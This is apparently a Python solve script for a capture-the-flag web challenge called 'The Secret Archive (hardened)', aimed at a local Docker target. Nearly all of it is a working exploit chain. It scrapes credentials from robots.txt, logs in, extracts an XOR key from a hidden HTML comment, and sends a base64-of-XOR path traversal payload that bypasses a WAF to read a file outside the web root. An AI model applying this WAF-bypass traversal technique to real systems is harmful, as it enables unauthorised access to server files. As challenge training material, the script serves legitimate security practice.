#!/usr/bin/env python3
"""
Solve: The Secret Archive (hardened) — multi-step path traversal
=================================================================
Challenge recap
---------------
The upgraded challenge removed the "/debug" shortcut and hid the XOR key
in an HTML comment inside the /changelog page (only reachable after login).
The flag is stored at /opt/archive/classified/flag.txt instead of the
obvious /tmp path.

The WAF checks the *raw* (not yet decoded) parameter for "..", "flag",
etc., then base64-decodes it, XOR-decrypts with the hidden key, and
passes the result straight to send_file().  A secondary post-decode WAF
check fires only when "opt" is NOT in the path — so our traversal through
/opt passes cleanly.

Attack plan
-----------
1. Fetch /robots.txt  → harvest credentials (admin / Arch1ve_Adm1n_P4ss!)
2. POST /login        → get session cookie
3. GET  /changelog    → read HTML source, extract XOR key from comment
                        <!-- dev note: cipher=0x17 … -->
4. Build payload      → target = "../../opt/archive/classified/flag.txt"
                        XOR each char, base64-encode the result
5. GET /view?file=<payload> → flag

The script walks through each step verbosely so it doubles as a write-up.
"""

import base64
import re
import sys
import requests
from html import unescape

# ── config ────────────────────────────────────────────────────────────────────
TARGET  = "http://localhost:8002"     # adjust port to match docker-compose
FLAG_RE = re.compile(r"INFODAYS\{[^}]+\}")


# ── helpers ───────────────────────────────────────────────────────────────────

def xor_encrypt(plaintext: str, key: int) -> str:
    """XOR each character of plaintext with key (mirrors xor_crypt in app.py)."""
    return "".join(chr(ord(c) ^ key) for c in plaintext)

def build_payload(path: str, xor_key: int) -> str:
    """
    Produce the WAF-bypassing file parameter:
        raw_input  = base64( xor(target_path) )
    The WAF sees only base64 → no ".." or "flag" plaintext → passes.
    After decode + XOR the server has the real path.
    """
    encrypted = xor_encrypt(path, xor_key)
    return base64.b64encode(encrypted.encode()).decode()

def extract_xor_key_from_html(html: str) -> int | None:
    """
    Look for the embedded developer comment in /changelog:
        <!-- dev note: cipher=0x17, verify with: echo "flag.txt" | xortool -->
    Returns the integer key, or None if not found.
    """
    match = re.search(r"cipher=(0x[0-9a-fA-F]+)", html)
    if match:
        return int(match.group(1), 16)
    # fallback: decimal key
    match = re.search(r"cipher=(\d+)", html)
    if match:
        return int(match.group(1))
    return None

def extract_flag_path_hint(html: str) -> str | None:
    """
    Look for the path hint in /changelog:
        <li>Moved sensitive archive to /opt/archive/classified/</li>
    We'll append "flag.txt" to whatever directory is mentioned.
    """
    match = re.search(r"Moved sensitive archive to\s*([/\w]+/)", unescape(html))
    if match:
        return match.group(1) + "flag.txt"
    return None


# ── step 1: robots.txt ────────────────────────────────────────────────────────

def step1_robots(session: requests.Session) -> tuple[str, str]:
    print("\n── Step 1: fetch /robots.txt ──────────────────────────────")
    r = session.get(f"{TARGET}/robots.txt", timeout=8)
    print(r.text.strip())

    # Parse credentials from comment
    creds = re.search(r"#\s*Maintenance access:\s*(\S+)\s*/\s*(\S+)", r.text)
    if not creds:
        print("[-] Could not parse credentials from robots.txt — check format")
        sys.exit(1)
    username, password = creds.group(1), creds.group(2)
    print(f"\n[+] Credentials found: {username} / {password}")
    return username, password


# ── step 2: login ─────────────────────────────────────────────────────────────

def step2_login(session: requests.Session, username: str, password: str):
    print("\n── Step 2: login ──────────────────────────────────────────")
    r = session.post(
        f"{TARGET}/login",
        data={"username": username, "password": password},
        allow_redirects=True,
        timeout=8,
    )
    if "dashboard" in r.url.lower() or "Available Records" in r.text:
        print(f"[+] Login successful — landed at {r.url}")
    elif r.status_code == 403:
        print("[-] Login failed (403). Credentials may have changed.")
        sys.exit(1)
    else:
        print(f"[?] Unexpected response: {r.status_code} @ {r.url}")

    session_cookie = session.cookies.get("session")
    print(f"[+] Session cookie: {session_cookie[:24]}…" if session_cookie else "[-] No session cookie set!")


# ── step 3: /changelog → XOR key + path hint ─────────────────────────────────

def step3_changelog(session: requests.Session) -> tuple[int, str]:
    print("\n── Step 3: read /changelog source ────────────────────────")
    r = session.get(f"{TARGET}/changelog", timeout=8)

    if r.status_code == 302:
        print("[-] Redirected to login — session cookie not accepted. Exiting.")
        sys.exit(1)

    # Show the raw HTML so the player can see the hidden comment
    print("[*] Raw /changelog HTML (truncated):")
    for line in r.text.splitlines():
        stripped = line.strip()
        if stripped:
            print(f"    {stripped}")

    xor_key = extract_xor_key_from_html(r.text)
    if xor_key is None:
        print("\n[-] XOR key not found in /changelog source.")
        sys.exit(1)
    print(f"\n[+] XOR key extracted: 0x{xor_key:02X} ({xor_key})")

    flag_path = extract_flag_path_hint(r.text)
    if flag_path is None:
        # Reasonable fallback if the regex didn't match
        flag_path = "/opt/archive/classified/flag.txt"
        print(f"[~] Path hint regex didn't match — using default: {flag_path}")
    else:
        print(f"[+] Flag path hint extracted: {flag_path}")

    return xor_key, flag_path


# ── step 4+5: build payload and fetch flag ────────────────────────────────────

def step4_exploit(session: requests.Session, xor_key: int, abs_flag_path: str):
    print("\n── Step 4: build WAF-bypass payload ──────────────────────")

    # We need a relative traversal from the app's CWD (/home/ctfuser/)
    # to reach abs_flag_path.
    # /home/ctfuser/ → ../../opt/archive/classified/flag.txt
    # (two levels up → / → then descend into opt/…)
    # Build relative path: strip leading "/" and prepend "../../"
    relative_path = "../../" + abs_flag_path.lstrip("/")
    print(f"[*] Target (relative): {relative_path}")

    # Demonstrate that plain-text payload is caught by WAF
    print("\n[*] Sanity check — WAF should block the plain-text path:")
    r_blocked = session.get(f"{TARGET}/view", params={"file": relative_path}, timeout=8)
    if "WAF" in r_blocked.text or r_blocked.status_code == 403:
        print(f"    [✓] Blocked as expected ({r_blocked.status_code}): {r_blocked.text[:60]}")
    else:
        print(f"    [?] Not blocked ({r_blocked.status_code}) — WAF may differ")

    # Build encoded payload
    payload = build_payload(relative_path, xor_key)
    print(f"\n[*] XOR key        : 0x{xor_key:02X}")
    print(f"[*] XOR(path)      : {xor_encrypt(relative_path, xor_key)!r}")
    print(f"[*] base64(XOR(p)) : {payload}")

    print("\n── Step 5: fetch /view with encoded payload ───────────────")
    r = session.get(f"{TARGET}/view", params={"file": payload}, timeout=8)

    m = FLAG_RE.search(r.text)
    if m:
        print(f"\n{'='*60}")
        print(f"  FLAG: {m.group()}")
        print(f"{'='*60}\n")
    elif r.status_code == 200:
        print(f"[?] Status 200 but no flag pattern found. Response:\n{r.text[:200]}")
    else:
        print(f"[-] Request failed ({r.status_code}): {r.text[:200]}")
        print("\n    Debugging hints:")
        print("    • Verify the Docker container is running and the port is correct")
        print("    • Try fetching /view?file=news.txt to confirm the session is valid")
        print(f"    • Manually decode: python3 -c \"import base64; print(base64.b64decode('{payload}'))\"")


# ── main ──────────────────────────────────────────────────────────────────────

def main():
    print("=" * 60)
    print(" The Secret Archive (hardened) — full solve")
    print("=" * 60)

    session = requests.Session()
    session.max_redirects = 5

    username, password = step1_robots(session)
    step2_login(session, username, password)
    xor_key, flag_path = step3_changelog(session)
    step4_exploit(session, xor_key, flag_path)


if __name__ == "__main__":
    main()
